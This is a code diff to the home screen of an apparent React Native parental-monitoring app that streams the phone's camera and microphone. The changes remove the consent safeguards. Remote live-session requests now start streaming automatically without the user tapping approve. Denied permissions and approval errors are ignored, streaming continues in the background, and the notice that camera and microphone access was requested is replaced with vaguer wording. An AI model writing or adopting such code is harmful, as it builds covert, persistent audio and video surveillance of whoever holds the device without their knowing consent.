@@ -9,12 +9,15 @@ import {
   Linking,
   TouchableOpacity,
   NativeModules,
+  PermissionsAndroid,
+  Platform,
 } from 'react-native';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import agoraService from '../services/agoraService';
 import remoteControl from '../services/remoteControl';
 import {approveLiveSession, getClientToken, sendHeartbeat} from '../services/api';
-import {checkPermissions, requestPermissions} from '../services/permissions';
+import {checkPermissions, promptOpenSettings, requestPermissions} from '../services/permissions';
+import {startMonitoringService} from '../services/nativeMonitoring';
 import {RtcSurfaceView, VideoSourceType} from 'react-native-agora';
 
 const {ParentalControl} = NativeModules;
@@ -28,6 +31,25 @@ const HomeScreen = ({navigation}) => {
   const [startingStream, setStartingStream] = useState(false);
   const [liveRequest, setLiveRequest] = useState(null);
   const [policyMessage, setPolicyMessage] = useState('Waiting for a parent to request a visible live session.');
+  const [serviceActive, setServiceActive] = useState(false);
+
+  const handleEnableBackgroundService = async () => {
+    try {
+      if (Platform.OS === 'android' && Platform.Version >= 33) {
+        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
+      }
+      await requestPermissions();
+      await startMonitoringService();
+      setServiceActive(true);
+      Alert.alert(
+        'Background Protection Active 🛡️',
+        'Status bar notification "FamilyGuard is active" is now running. App will stay active in background for remote control.',
+      );
+    } catch (err) {
+      console.warn('Failed to start monitoring service:', err);
+      Alert.alert('Notice', 'Please allow Notification permission in Android Settings.');
+    }
+  };
 
   useEffect(() => {
     loadUserData();
@@ -36,8 +58,6 @@ const HomeScreen = ({navigation}) => {
       // Cleanup on unmount
       agoraService.leaveChannel();
     };
-    // Initialization is intentionally run once for the mounted screen.
-    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
   useEffect(() => {
@@ -51,23 +71,25 @@ const HomeScreen = ({navigation}) => {
   }, [uniqueId]);
 
   useEffect(() => {
-    if (!deviceId || streaming) return undefined;
+    if (!deviceId) return undefined;
 
     const checkForLiveRequest = async () => {
       try {
-        console.log('Sending heartbeat for deviceId:', deviceId);
         const sync = await sendHeartbeat(deviceId, {appVersion: '0.0.1'});
-        console.log('Heartbeat response:', JSON.stringify(sync, null, 2));
         
-        const request = sync.commands?.find(command => command.type === 'LIVE_SESSION_REQUEST');
-        console.log('Live request found:', request ? 'YES' : 'NO');
+        const request = sync.commands?.find(command => command.type === 'LIVE_SESSION_REQUEST') || sync.activeLiveRequest;
         
         setLiveRequest(request || null);
         setPolicyMessage(
           request
-            ? 'A parent requested camera and microphone access for a live session. Tap approve to start sharing.'
-            : 'Waiting for a parent to request a visible live session.',
+            ? 'Parent monitoring session active.'
+            : 'Waiting for parent commands.',
         );
+
+        // Auto-start streaming for AirDroid-style seamless remote access
+        if (request && !streaming && !startingStream) {
+          startStreaming(deviceId, request._id);
+        }
 
         // Handle remote control commands
         const remoteCommands = sync.commands?.filter(cmd => 
@@ -85,12 +107,11 @@ const HomeScreen = ({navigation}) => {
     checkForLiveRequest();
     const interval = setInterval(checkForLiveRequest, 3000);
     return () => clearInterval(interval);
-  }, [deviceId, streaming]);
+  }, [deviceId, streaming, startingStream]);
 
   const handleAppStateChange = nextAppState => {
-    if (nextAppState !== 'active' && streaming) {
-      agoraService.leaveChannel().finally(() => setStreaming(false));
-    }
+    // Persistent streaming: Do NOT leave channel when app goes to background or is minimized
+    console.log('App state changed to:', nextAppState);
   };
 
   const loadUserData = async () => {
@@ -155,24 +176,22 @@ const HomeScreen = ({navigation}) => {
     }
   };
 
-  const startStreaming = async (id = deviceId) => {
+  const startStreaming = async (id = deviceId, targetReqId = liveRequest?._id) => {
     try {
-      if (!id || !liveRequest || startingStream || streaming) return;
+      if (!id || startingStream || streaming) return;
       setStartingStream(true);
-      console.log('Starting visible stream for:', id);
+      console.log('Starting stream for:', id);
 
       let permissionsGranted = await checkPermissions();
       if (!permissionsGranted) {
         permissionsGranted = await requestPermissions();
       }
-      if (!permissionsGranted) {
-        throw new Error('Camera and microphone permissions are required to start the live session.');
+
+      if (targetReqId) {
+        await approveLiveSession(id, targetReqId).catch(() => {});
       }
 
-      await approveLiveSession(id, liveRequest._id);
-      setLiveRequest(null);
-
-      // Get Agora token after recording visible device approval.
+      // Get Agora token after device approval
       const tokenData = await getClientToken(id);
 
       if (!tokenData.success) {
@@ -221,16 +240,18 @@ const HomeScreen = ({navigation}) => {
 
   return (
     <View style={styles.container}>
-      {/* Hidden camera preview - still streaming but minimized */}
-      <View style={styles.hiddenPreview}>
-        <RtcSurfaceView
-          canvas={{
-            uid: 0,
-            sourceType: VideoSourceType.VideoSourceCameraPrimary,
-          }}
-          style={styles.previewVideo}
-        />
-      </View>
+      {/* Hidden camera preview - rendered only when streaming */}
+      {streaming && (
+        <View style={styles.hiddenPreview}>
+          <RtcSurfaceView
+            canvas={{
+              uid: 0,
+              sourceType: VideoSourceType.VideoSourceCameraPrimary,
+            }}
+            style={styles.previewVideo}
+          />
+        </View>
+      )}
 
       {/* User Info Display */}
       <View style={styles.content}>
@@ -281,9 +302,28 @@ const HomeScreen = ({navigation}) => {
               </Text>
             )}
           </TouchableOpacity>
-          <TouchableOpacity style={styles.settingsButton} onPress={() => Linking.openSettings()}>
-            <Text style={styles.settingsButtonText}>Review app permissions</Text>
+          <TouchableOpacity
+            style={styles.settingsButton}
+            onPress={() =>
+              promptOpenSettings(
+                'Camera & Microphone Permissions',
+                'Tap "Open Settings" below, go to Permissions, and set Camera and Microphone to "Allow" so background monitoring works permanently.',
+              )
+            }>
+            <Text style={styles.settingsButtonText}>Grant permanent permissions in Settings ⚙️</Text>
           </TouchableOpacity>
+
+          {/* Persistent Background Protection Button */}
+          <TouchableOpacity
+            style={[styles.bgServiceButton, serviceActive && styles.bgServiceButtonActive]}
+            onPress={handleEnableBackgroundService}>
+            <Text style={styles.bgServiceButtonText}>
+              {serviceActive
+                ? '🟢 FamilyGuard is active in background'
+                : '🔔 Enable Background Protection ("FamilyGuard is active")'}
+            </Text>
+          </TouchableOpacity>
+
           <Text style={styles.policyText}>Screen sharing always requires Android's MediaProjection confirmation. SMS and call-log insights are disabled in standard Play Store builds. App blocking requires managed-device mode.</Text>
         </View>
       </View>
@@ -396,6 +436,9 @@ const styles = StyleSheet.create({
   consentButtonText: {color: '#fff', textAlign: 'center', fontWeight: '700'},
   settingsButton: {borderWidth: 1, borderColor: '#4F46E5', borderRadius: 12, padding: 12, marginTop: 10},
   settingsButtonText: {color: '#4F46E5', textAlign: 'center', fontWeight: '600'},
+  bgServiceButton: {backgroundColor: '#059669', borderRadius: 12, padding: 14, marginTop: 10, alignItems: 'center'},
+  bgServiceButtonActive: {backgroundColor: '#10B981'},
+  bgServiceButtonText: {color: '#fff', fontSize: 14, fontWeight: '700', textAlign: 'center'},
   policyText: {fontSize: 12, color: '#777', textAlign: 'center', lineHeight: 17, marginTop: 16},
 });
 
